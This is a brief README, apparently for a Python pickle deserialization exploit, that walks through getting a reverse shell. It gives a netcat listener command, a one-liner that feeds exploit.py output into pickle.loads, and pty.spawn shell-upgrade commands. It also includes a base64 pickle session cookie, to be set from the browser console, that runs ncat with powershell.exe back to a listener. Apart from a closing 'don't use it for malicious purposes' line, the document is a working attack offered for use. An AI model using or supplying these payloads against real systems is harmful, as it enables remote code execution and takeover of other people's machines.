# Use wisely

In your terminal, run:
```
nc -nlvp 4444
```
Maybe "nc" doesn't work in your system and you should use "ncat"


In other computer run:
```
python3 -c "import pickle; pickle.loads($(python3 exploit.py))"
```
Note: Don't forget to change the host value

# Python 2
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

# Python 3
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

# exploit_rvs_web.py
In your terminal, run:
```
nc -nlvp 4444
```
Maybe "nc" doesn't work in your system and you should use "ncat"

Then run:
```
python3 exploit_rvs_web.py
```

And then in web console put the paste it in cookies, like:
```
document.cookie = 'session=gASVQAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCVuY2F0IGxvY2FsaG9zdCA0NDQ0IC1lIHBvd2Vyc2hlbGwuZXhllIWUUpQu'
```

# Again:
Don't use it for malicious purposes, use it to make your system or your client's system more secure!